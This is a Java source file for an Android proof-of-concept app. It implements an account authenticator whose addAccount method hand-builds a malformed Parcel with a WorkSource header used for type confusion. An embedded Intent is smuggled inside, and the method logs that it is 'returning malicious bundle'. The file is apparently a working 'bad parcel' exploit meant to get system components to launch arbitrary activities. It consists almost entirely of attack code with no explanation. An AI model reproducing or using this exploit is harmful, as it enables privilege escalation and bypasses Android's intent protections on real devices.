package com.example.tzpoc;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.NetworkErrorException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;

public class MyAuthenticator extends AbstractAccountAuthenticator {

    public MyAuthenticator(Context context) {
        super(context);
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
        return null;
    }

    @Override
    public Bundle addAccount(AccountAuthenticatorResponse response, String accountType,
                             String authTokenType, String[] requiredFeatures, Bundle options)
            throws NetworkErrorException {
        final String TAG = "BadParcel";

        // ProofActivity を起動するIntent
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("com.example.tzpoc",
                "com.example.tzpoc.ProofActivity"));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        Bundle bundle = new Bundle();
        Parcel obtain = Parcel.obtain();
        Parcel obtain2 = Parcel.obtain();
        Parcel obtain3 = Parcel.obtain();

        // WorkSource ヘッダー（型混淆用）
        obtain2.writeInt(3);
        obtain2.writeInt(13);
        obtain2.writeInt(2);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(6);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(4);
        obtain2.writeString("android.os.WorkSource");
        obtain2.writeInt(-1);
        obtain2.writeInt(-1);
        obtain2.writeInt(-1);
        obtain2.writeInt(1);
        obtain2.writeInt(-1);
        obtain2.writeInt(13);
        obtain2.writeInt(13);
        obtain2.writeInt(68);
        obtain2.writeInt(11);
        obtain2.writeInt(0);
        obtain2.writeInt(7);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(1);
        obtain2.writeInt(1);
        obtain2.writeInt(13);
        obtain2.writeInt(22);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(0);
        obtain2.writeInt(13);
        obtain2.writeInt(-1);

        int dataPosition = obtain2.dataPosition();
        obtain2.writeString("intent");
        obtain2.writeInt(4);  // PARCELABLE
        obtain2.writeString("android.content.Intent");
        intent.writeToParcel(obtain3, 0);
        obtain2.appendFrom(obtain3, 0, obtain3.dataSize());

        int dataPosition2 = obtain2.dataPosition();
        obtain2.setDataPosition(dataPosition - 4);
        obtain2.writeInt(dataPosition2 - dataPosition);
        obtain2.setDataPosition(dataPosition2);

        int dataSize = obtain2.dataSize();
        Log.d(TAG, "length is " + Integer.toHexString(dataSize));

        obtain.writeInt(dataSize);
        obtain.writeInt(0x4c444e42); // "BDNL"
        obtain.appendFrom(obtain2, 0, dataSize);
        obtain.setDataPosition(0);

        try {
            bundle.readFromParcel(obtain);
        } catch (Exception e) {
            Log.e(TAG, "Failed to read parcel: " + e.getMessage());
            return new Bundle();
        }

        obtain.recycle();
        obtain2.recycle();
        obtain3.recycle();

        Log.i(TAG, "Returning malicious bundle with Intent");
        return bundle;
    }

    // その他必須オーバーライド（空実装）
    @Override
    public Bundle confirmCredentials(AccountAuthenticatorResponse response, Account account, Bundle options) {
        return null;
    }
    @Override
    public Bundle getAuthToken(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) {
        return null;
    }
    @Override
    public String getAuthTokenLabel(String authTokenType) {
        return null;
    }
    @Override
    public Bundle updateCredentials(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) {
        return null;
    }
    @Override
    public Bundle hasFeatures(AccountAuthenticatorResponse response, Account account, String[] features) {
        return null;
    }
}
